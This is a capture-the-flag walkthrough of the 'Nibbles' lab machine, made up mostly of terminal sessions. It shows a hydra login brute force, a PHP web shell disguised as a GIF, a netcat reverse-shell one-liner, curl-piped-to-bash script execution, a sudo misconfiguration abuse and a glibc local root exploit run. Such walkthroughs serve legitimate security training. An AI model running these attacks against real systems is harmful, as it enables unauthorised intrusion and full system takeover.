#### Nibbles

- [Attacker Info](#attacker-info)
- [Nmap Scan](#nmap-scan)
- [Web Enumeration](#web-enumeration)
- [Code Execution](#code-execution)
- [User Shell](#user-shell)
- [Root Shell](#root-shell)
- [Kernel Exploitation](#kernel-exploitation)

###### Attacker Info

```sh
root@kali:~/nibbles# ip addr
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 00:0c:29:7f:39:f2 brd ff:ff:ff:ff:ff:ff
    inet 10.0.0.82/24 brd 10.0.0.255 scope global dynamic noprefixroute eth0
       valid_lft 604550sec preferred_lft 604550sec
    inet6 2601:5cc:c900:4024::b31c/128 scope global dynamic noprefixroute
       valid_lft 604552sec preferred_lft 604552sec
    inet6 2601:5cc:c900:4024:b49a:f5ba:8f10:5d4b/64 scope global temporary dynamic
       valid_lft 64437sec preferred_lft 64437sec
    inet6 2601:5cc:c900:4024:20c:29ff:fe7f:39f2/64 scope global dynamic mngtmpaddr noprefixroute
       valid_lft 64437sec preferred_lft 64437sec
    inet6 fe80::20c:29ff:fe7f:39f2/64 scope link noprefixroute
       valid_lft forever preferred_lft forever
3: tun0: <POINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UNKNOWN group default qlen 100
    link/none
    inet 10.10.14.5/23 brd 10.10.15.255 scope global tun0
       valid_lft forever preferred_lft forever
    inet6 dead:beef:2::1003/64 scope global
       valid_lft forever preferred_lft forever
    inet6 fe80::3bd8:c7d7:4a24:8ec1/64 scope link stable-privacy
       valid_lft forever preferred_lft forever
root@kali:~/nibbles#
```

###### Nmap Scan

```sh
root@kali:~/nibbles# nmap -sC -sV -oA nibbles.nmap 10.10.10.75
Starting Nmap 7.70 ( https://nmap.org ) at 2018-11-10 09:26 EST
Nmap scan report for 10.10.10.75
Host is up (0.15s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.24 seconds
root@kali:~/nibbles#
```

![](images/3.png)

![](images/4.png)

###### Web Enumeration

```sh
root@kali:~/nibbles# gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.10.75 -t 30

=====================================================
Gobuster v2.0.0              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.10.75/
[+] Threads      : 30
[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes : 200,204,301,302,307,403
[+] Timeout      : 10s
=====================================================
2018/11/10 13:40:42 Starting gobuster
=====================================================
/server-status (Status: 403)
=====================================================
2018/11/10 13:56:23 Finished
=====================================================
root@kali:~/nibbles#
```

```
http://10.10.10.75/
view-source:http://10.10.10.75/
```

![](images/1.png)

![](images/2.png)

```
http://10.10.10.75/nibbleblog/
```

![](images/5.png)

```
http://www.nibbleblog.com/
```

![](images/6.png)

```sh
root@kali:~/nibbles# cp ~/Downloads/nibbleblog-v4.0.5.zip .
root@kali:~/nibbles# unzip nibbleblog-v4.0.5.zip
root@kali:~/nibbles/nibbleblog-v4.0.5# grep -R 4.0.5 . | awk -F: '{print $1}' | uniq
./admin/js/tinymce/skins/lightgray/fonts/tinymce.svg
./admin/js/tinymce/skins/lightgray/fonts/tinymce-small.svg
./admin/boot/rules/98-constants.bit
root@kali:~/nibbles/nibbleblog-v4.0.5#
```

```sh
root@kali:~/nibbles/nibbleblog-v4.0.5# vim ./admin/boot/rules/98-constants.bit
```

![](images/7.png)

```sh
http://10.10.10.75/nibbleblog/admin/boot/rules/98-constants.bit
view-source:http://10.10.10.75/nibbleblog/admin/boot/rules/98-constants.bit
```

![](images/8.png)

![](images/9.png)

```sh
root@kali:~/nibbles# searchsploit nibbleblog
--------------------------------------- ----------------------------------------
 Exploit Title                         |  Path
                                       | (/usr/share/exploitdb/)
--------------------------------------- ----------------------------------------
Nibbleblog 3 - Multiple SQL Injections | exploits/php/webapps/35865.txt
Nibbleblog 4.0.3 - Arbitrary File Uplo | exploits/php/remote/38489.rb
--------------------------------------- ----------------------------------------
Shellcodes: No Result
root@kali:~/nibbles#
```

```sh
root@kali:~/nibbles# searchsploit -m exploits/php/remote/38489.rb
  Exploit: Nibbleblog 4.0.3 - Arbitrary File Upload (Metasploit)
      URL: https://www.exploit-db.com/exploits/38489/
     Path: /usr/share/exploitdb/exploits/php/remote/38489.rb
File Type: Ruby script, ASCII text, with CRLF line terminators

Copied to: /root/nibbles/38489.rb


root@kali:~/nibbles#
```

![](images/10.png)

```sh
root@kali:~/nibbles# cd nibbleblog-v4.0.5/
root@kali:~/nibbles/nibbleblog-v4.0.5# ls
admin  admin.php  content  COPYRIGHT.txt  feed.php  index.php  install.php  languages  LICENSE.txt  plugins  sitemap.php  themes  update.php
root@kali:~/nibbles/nibbleblog-v4.0.5#
```

```
http://10.10.10.75/nibbleblog/admin.php
```

![](images/11.png)

![](images/17.png)

![](images/18.png)

```sh
root@kali:~/nibbles# cp /opt/SecLists/Passwords/Leaked-Databases/rockyou-50.txt .
```

```sh
root@kali:~/nibbles# hydra -l admin -P rockyou-50.txt 10.10.10.75 http-post-form "/nibbleblog/admin.php:username=^USER^&password=^PASS^:Incorrect username"
Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (http://www.thc.org/thc-hydra) starting at 2018-11-10 14:23:05
[DATA] max 16 tasks per 1 server, overall 16 tasks, 9438 login tries (l:1/p:9438), ~590 tries per task
[DATA] attacking http-post-form://10.10.10.75:80//nibbleblog/admin.php:username=^USER^&password=^PASS^:Incorrect username
[80][http-post-form] host: 10.10.10.75   login: admin   password: iloveyou
[80][http-post-form] host: 10.10.10.75   login: admin   password: password
[80][http-post-form] host: 10.10.10.75   login: admin   password: lovely
[80][http-post-form] host: 10.10.10.75   login: admin   password: nicole
[80][http-post-form] host: 10.10.10.75   login: admin   password: 654321
[80][http-post-form] host: 10.10.10.75   login: admin   password: jessica
[80][http-post-form] host: 10.10.10.75   login: admin   password: monkey
[80][http-post-form] host: 10.10.10.75   login: admin   password: ashley
[80][http-post-form] host: 10.10.10.75   login: admin   password: michael
1 of 1 target successfully completed, 9 valid passwords found
[WARNING] Writing restore file because 1 final worker threads did not complete until end.
[ERROR] 1 target did not resolve or could not be connected
[ERROR] 16 targets did not complete
Hydra (http://www.thc.org/thc-hydra) finished at 2018-11-10 14:23:08
root@kali:~/nibbles#
```

![](images/16.png)

```
http://10.10.10.75/nibbleblog/install.php
```

![](images/12.png)

```
http://10.10.10.75/nibbleblog/update.php
```

![](images/13.png)

```
http://10.10.10.75/nibbleblog/content/private/
```

![](images/14.png)

```
http://10.10.10.75/nibbleblog/content/private/users.xml
```

![](images/15.png)

```
http://10.10.10.75/nibbleblog/admin.php
```

```
admin
nibbles
```

![](images/19.png)

![](images/20.png)

###### Code Execution

- [`NibbleBlog 4.0.3: Code Execution`](https://curesec.com/blog/article/blog/NibbleBlog-403-Code-Execution-47.html)

```
http://10.10.10.75/nibbleblog/admin.php?controller=plugins&action=list
http://10.10.10.75/nibbleblog/admin.php?controller=plugins&action=config&plugin=my_image
```

```sh
root@kali:~/nibbles# cat shell.php
GIF8;
<?php echo system($_REQUEST['cmd']); ?>
root@kali:~/nibbles#
root@kali:~/nibbles# file shell.php
shell.php: GIF image data 16188 x 26736
root@kali:~/nibbles#
```

![](images/21.png)

![](images/22.png)

![](images/23.png)

```
http://10.10.10.75/nibbleblog/content/private/plugins/my_image/
http://10.10.10.75/nibbleblog/content/private/plugins/my_image/image.php?cmd=id
```

![](images/24.png)

![](images/25.png)

![](images/26.png)

![](images/27.png)

![](images/28.png)

![](images/29.png)

###### User Shell

- [`reverse-shell-cheat-sheet`](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)

```sh
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
```

![](images/30.png)

```sh
root@kali:~/nibbles# nc -nlvp 1234
listening on [any] 1234 ...
connect to [10.10.14.5] from (UNKNOWN) [10.10.10.75] 53348
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)
$
```

- [`upgrading-simple-shells-to-fully-interactive-ttys`](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/)

```sh
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
nibbler@Nibbles:/var/www/html/nibbleblog/content/private/plugins/my_image$ ^Z
[1]+  Stopped                 nc -nlvp 1234
root@kali:~/nibbles# stty -a
speed 38400 baud; rows 51; columns 204; line = 0;
intr = ^C; quit = ^\; erase = ^?; kill = ^U; eof = ^D; eol = M-^?; eol2 = M-^?; swtch = <undef>; start = ^Q; stop = ^S; susp = ^Z; rprnt = ^R; werase = ^W; lnext = ^V; discard = ^O; min = 1; time = 0;
-parenb -parodd -cmspar cs8 -hupcl -cstopb cread -clocal -crtscts
-ignbrk -brkint -ignpar -parmrk -inpck -istrip -inlcr -igncr icrnl ixon -ixoff -iuclc ixany imaxbel iutf8
opost -olcuc -ocrnl onlcr -onocr -onlret -ofill -ofdel nl0 cr0 tab0 bs0 vt0 ff0
isig icanon iexten echo echoe echok -echonl -noflsh -xcase -tostop -echoprt echoctl echoke -flusho -extproc
root@kali:~/nibbles# echo $TERM
xterm-256color
root@kali:~/nibbles# stty raw -echo
root@kali:~/nibbles# nc -nlvp 1234
<ml/nibbleblog/content/private/plugins/my_image$ reset
reset: unknown terminal type unknown
Terminal type? xterm-256color

<ml/nibbleblog/content/private/plugins/my_image$ stty rows 51 columns 204
nibbler@Nibbles:/var/www/html/nibbleblog/content/private/plugins/my_image$
```

```sh
nibbler@Nibbles:/var/www/html/nibbleblog/content/private/plugins/my_image$ cd ~
nibbler@Nibbles:/home/nibbler$ cat user.txt
b02ff32bb332deba49eeaed21152c8d8
nibbler@Nibbles:/home/nibbler$
```

###### Root Shell

```sh
nibbler@Nibbles:/home/nibbler$ sudo -l
sudo: unable to resolve host Nibbles: Connection timed out
Matching Defaults entries for nibbler on Nibbles:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User nibbler may run the following commands on Nibbles:
    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
nibbler@Nibbles:/home/nibbler$
```

```sh
nibbler@Nibbles:/home/nibbler$ mkdir -p /home/nibbler/personal/stuff/
nibbler@Nibbles:/home/nibbler$ cd /home/nibbler/personal/stuff/
nibbler@Nibbles:/home/nibbler/personal/stuff$ ls -l
total 0
nibbler@Nibbles:/home/nibbler/personal/stuff$ echo "bash" > monitor.sh
nibbler@Nibbles:/home/nibbler/personal/stuff$ chmod +x monitor.sh
nibbler@Nibbles:/home/nibbler/personal/stuff$ sudo ./monitor.sh
sudo: unable to resolve host Nibbles: Connection timed out
root@Nibbles:/home/nibbler/personal/stuff# id
uid=0(root) gid=0(root) groups=0(root)
root@Nibbles:/home/nibbler/personal/stuff# cd /root
root@Nibbles:~# ls
root.txt
root@Nibbles:~# cat root.txt
b6d745c0dfb6457c55591efc898ef88c
root@Nibbles:~#
```

###### Kernel Exploitation

- [`linux-exploit-suggester`](https://github.com/mzet-/linux-exploit-suggester)

![](images/31.png)

![](images/32.png)

```sh
root@kali:~/nibbles# git clone https://github.com/mzet-/linux-exploit-suggester.git /opt/linux-exploit-suggester
Cloning into '/opt/linux-exploit-suggester'...
remote: Enumerating objects: 13, done.
remote: Counting objects: 100% (13/13), done.
remote: Compressing objects: 100% (11/11), done.
remote: Total 314 (delta 6), reused 6 (delta 2), pack-reused 301
Receiving objects: 100% (314/314), 302.67 KiB | 4.52 MiB/s, done.
Resolving deltas: 100% (167/167), done.
root@kali:~/nibbles#
root@kali:~/nibbles# cp /opt/linux-exploit-suggester/linux-exploit-suggester.sh .
```

```sh
root@kali:~/nibbles# python -m SimpleHTTPServer 80
Serving HTTP on 0.0.0.0 port 80 ...
10.10.10.75 - - [10/Nov/2018 15:34:37] "GET /linux-exploit-suggester.sh HTTP/1.1" 200 -
```

```sh
nibbler@Nibbles:/home/nibbler$ curl http://10.10.14.5/linux-exploit-suggester.sh | bash
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 68294  100 68294    0     0  68592      0 --:--:-- --:--:-- --:--:-- 68568

Available information:

Kernel version: 4.4.0
Architecture: x86_64
Distribution: ubuntu
Distribution version: 16.04.3
Additional checks (CONFIG_*, sysctl entries, custom Bash commands): performed
Package listing: from current OS

Searching among:

70 kernel space exploits
34 user space exploits

Possible Exploits:

[+] [CVE-2016-0728] keyring

   Details: http://perception-point.io/2016/01/14/analysis-and-exploitation-of-a-linux-kernel-vulnerability-cve-2016-0728/
   Download URL: https://www.exploit-db.com/download/40003
   Comments: Exploit takes about ~30 minutes to run. Exploit is not reliable, see: https://cyseclabs.com/blog/cve-2016-0728-poc-not-working

[+] [CVE-2016-2384] usb-midi

   Details: https://xairy.github.io/blog/2016/cve-2016-2384
   Tags: ubuntu=14.04,fedora=22
   Download URL: https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2016-2384/poc.c
   Comments: Requires ability to plug in a malicious USB device and to execute a malicious binary as a non-privileged user

cat: write error: Broken pipe
[+] [CVE-2016-4557] double-fdput()

   Details: https://bugs.chromium.org/p/project-zero/issues/detail?id=808
   Tags: [ ubuntu=16.04 ]{kernel:4.4.0-21-generic}
   Download URL: https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/bin-sploits/39772.zip
   Comments: CONFIG_BPF_SYSCALL needs to be set && kernel.unprivileged_bpf_disabled != 1

[+] [CVE-2016-5195] dirtycow

   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
   Tags: debian=7|8,RHEL=5{kernel:2.6.(18|24|33)-*},RHEL=6{kernel:2.6.32-*|3.(0|2|6|8|10).*|2.6.33.9-rt31},RHEL=7{kernel:3.10.0-*|4.2.0-0.21.el7},[ ubuntu=16.04|14.04|12.04 ]
   Download URL: https://www.exploit-db.com/download/40611
   Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh

[+] [CVE-2016-5195] dirtycow 2

   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
   Tags: debian=7|8,RHEL=5|6|7,ubuntu=14.04|12.04,ubuntu=10.04{kernel:2.6.32-21-generic},[ ubuntu=16.04 ]{kernel:4.4.0-21-generic}
   Download URL: https://www.exploit-db.com/download/40839
   ext-url: https://www.exploit-db.com/download/40847.cpp
   Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh

cat: write error: Broken pipe
[+] [CVE-2016-8655] chocobo_root

   Details: http://www.openwall.com/lists/oss-security/2016/12/06/1
   Tags: [ ubuntu=(14.04|16.04) ]{kernel:4.4.0-(21|22|24|28|31|34|36|38|42|43|45|47|51)-generic}
   Download URL: https://www.exploit-db.com/download/40871
   Comments: CAP_NET_RAW capability is needed OR CONFIG_USER_NS=y needs to be enabled

cat: write error: Broken pipe
[+] [CVE-2016-9793] SO_{SND|RCV}BUFFORCE

   Details: https://github.com/xairy/kernel-exploits/tree/master/CVE-2016-9793
   Download URL: https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2016-9793/poc.c
   Comments: CAP_NET_ADMIN caps OR CONFIG_USER_NS=y needed. No SMEP/SMAP/KASLR bypass included. Tested in QEMU only

cat: write error: Broken pipe
[+] [CVE-2017-6074] dccp

   Details: http://www.openwall.com/lists/oss-security/2017/02/22/3
   Tags: [ ubuntu=(14.04|16.04) ]{kernel:4.4.0-62-generic}
   Download URL: https://www.exploit-db.com/download/41458
   Comments: Requires Kernel be built with CONFIG_IP_DCCP enabled. Includes partial SMEP/SMAP bypass

cat: write error: Broken pipe
[+] [CVE-2017-7308] af_packet

   Details: https://googleprojectzero.blogspot.com/2017/05/exploiting-linux-kernel-via-packet.html
   Tags: [ ubuntu=16.04 ]{kernel:4.8.0-(34|36|39|41|42|44|45)-generic}
   Download URL: https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2017-7308/poc.c
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/cve-2017-7308/CVE-2017-7308/poc.c
   Comments: CAP_NET_RAW cap or CONFIG_USER_NS=y needed. Modified version at 'ext-url' adds support for additional kernels

cat: write error: Broken pipe
[+] [CVE-2017-16995] eBPF_verifier

   Details: https://ricklarabee.blogspot.com/2018/07/ebpf-and-analysis-of-get-rekt-linux.html
   Tags: debian=9,fedora=25|26|27,[ ubuntu=14.04|16.04|17.04 ]
   Download URL: https://www.exploit-db.com/download/45010
   Comments: CONFIG_BPF_SYSCALL needs to be set && kernel.unprivileged_bpf_disabled != 1

cat: write error: Broken pipe
[+] [CVE-2017-1000112] NETIF_F_UFO

   Details: http://www.openwall.com/lists/oss-security/2017/08/13/1
   Tags: ubuntu=14.04{kernel:4.4.0-*},[ ubuntu=16.04 ]{kernel:4.8.0-*}
   Download URL: https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2017-1000112/poc.c
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/cve-2017-1000112/CVE-2017-1000112/poc.c
   Comments: CAP_NET_ADMIN cap or CONFIG_USER_NS=y needed. SMEP/KASLR bypass included. Modified version at 'ext-url' adds support for additional distros/kernels

[+] [CVE-2017-1000253] PIE_stack_corruption

   Details: https://www.qualys.com/2017/09/26/linux-pie-cve-2017-1000253/cve-2017-1000253.txt
   Tags: RHEL=6,RHEL=7{kernel:3.10.0-514.21.2|3.10.0-514.26.1}
   Download URL: https://www.qualys.com/2017/09/26/linux-pie-cve-2017-1000253/cve-2017-1000253.c

[+] [CVE-2009-1185] udev 2

   Details: https://www.exploit-db.com/exploits/8478/
   Download URL: https://www.exploit-db.com/download/8478
   Comments: SSH access to non privileged user is needed. Version<1.4.1 vulnerable but distros use own versioning scheme. Manual verification needed

[+] [CVE-2017-0358] ntfs-3g-modprobe

   Details: https://bugs.chromium.org/p/project-zero/issues/detail?id=1072
   Tags: [ ubuntu=16.04|16.10 ],debian=7|8
   Download URL: https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/bin-sploits/41356.zip
   Comments: Distros use own versioning scheme. Manual verification needed. Linux headers must be installed. System must have at least two CPU cores.

[+] [CVE-2017-1000366,CVE-2017-1000379] linux_ldso_hwcap_64

   Details: https://www.qualys.com/2017/06/19/stack-clash/stack-clash.txt
   Tags: debian=7.7|8.5|9.0,ubuntu=14.04.2|16.04.2|17.04,fedora=22|25,centos=7.3.1611
   Download URL: https://www.qualys.com/2017/06/19/stack-clash/linux_ldso_hwcap_64.c
   Comments: Uses "Stack Clash" technique, works against most SUID-root binaries

cat: write error: Broken pipe
[+] [CVE-2018-1000001] RationalLove

   Details: https://www.halfdog.net/Security/2017/LibcRealpathBufferUnderflow/
   Tags: debian=9{glibc:2.24-11+deb9u1},[ ubuntu=16.04.3 ]{glibc:2.23-0ubuntu9}
   Download URL: https://www.halfdog.net/Security/2017/LibcRealpathBufferUnderflow/RationalLove.c
   Comments: kernel.unprivileged_userns_clone=1 required

nibbler@Nibbles:/home/nibbler$
```

```sh
root@kali:~/nibbles# python -m SimpleHTTPServer 80
Serving HTTP on 0.0.0.0 port 80 ...
10.10.10.75 - - [10/Nov/2018 15:34:37] "GET /linux-exploit-suggester.sh HTTP/1.1" 200 -
10.10.10.75 - - [10/Nov/2018 15:36:15] "GET /RationalLove.c HTTP/1.1" 200 -
```

```sh
root@kali:~/nibbles# wget https://www.halfdog.net/Security/2017/LibcRealpathBufferUnderflow/RationalLove.c
--2018-11-10 15:35:43--  https://www.halfdog.net/Security/2017/LibcRealpathBufferUnderflow/RationalLove.c
Resolving www.halfdog.net (www.halfdog.net)... 37.186.9.82
Connecting to www.halfdog.net (www.halfdog.net)|37.186.9.82|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 36028 (35K) [text/x-csrc]
Saving to: ‘RationalLove.c’

RationalLove.c                                     100%[================================================================================================================>]  35.18K  91.2KB/s    in 0.4s

2018-11-10 15:35:48 (91.2 KB/s) - ‘RationalLove.c’ saved [36028/36028]

root@kali:~/nibbles#
```

```sh
nibbler@Nibbles:/home/nibbler$ ldd --version
ldd (Ubuntu GLIBC 2.23-0ubuntu9) 2.23
Copyright (C) 2016 Free Software Foundation, Inc.
This is free software; see the source for copying conditions.  There is NO
warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
Written by Roland McGrath and Ulrich Drepper.
nibbler@Nibbles:/home/nibbler$
```

```sh
nibbler@Nibbles:/home/nibbler$ cat /etc/lsb-release
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=16.04
DISTRIB_CODENAME=xenial
DISTRIB_DESCRIPTION="Ubuntu 16.04.3 LTS"
nibbler@Nibbles:/home/nibbler$
```

![](images/33.png)

```sh
root@kali:~/nibbles# grep Compile RationalLove.c
 *  Compile: gcc -o RationalLove RationalLove.c
root@kali:~/nibbles#
```

```sh
nibbler@Nibbles:/home/nibbler$ gcc -o RationalLove RationalLove.c
nibbler@Nibbles:/home/nibbler$ ./RationalLove
./RationalLove: setting up environment ...
Detected OS version: "16.04.3 LTS (Xenial Xerus)"
./RationalLove: using umount at "/bin/umount".
No pid supplied via command line, trying to create a namespace
CAVEAT: /proc/sys/kernel/unprivileged_userns_clone must be 1 on systems with USERNS protection.
Namespaced filesystem created with pid 37532
Attempting to gain root, try 1 of 10 ...
Starting subprocess
Stack content received, calculating next phase
Found source address location 0x7ffdf80756c8 pointing to target address 0x7ffdf8075798 with value 0x7ffdf8076221, libc offset is 0x7ffdf80756b8
Changing return address from 0x7f6f31337830 to 0x7f6f313d6e00, 0x7f6f313e3a20
Using escalation string %69$hn%73$hn%1$12605.12605s%67$hn%1$1.1s%71$hn%1$2274.2274s%70$hn%1$13280.13280s%66$hn%1$4463.4463s%68$hn%72$hn%1$32913.32913s%1$22182.22182s%1$s%1$s%65$hn%1$s%1$s%1$s%1$s%1$s%1$s%1$186.186s%39$hn-%35$lx-%39$lx-%64$lx-%65$lx-%66$lx-%67$lx-%68$lx-%69$lx-%70$lx-%71$lx-%78$s
Executable now root-owned
Cleanup completed, re-invoking binary
/proc/self/exe: invoked as SUID, invoking shell ...
# id
uid=0(root) gid=0(root) groups=0(root),1001(nibbler)
#
```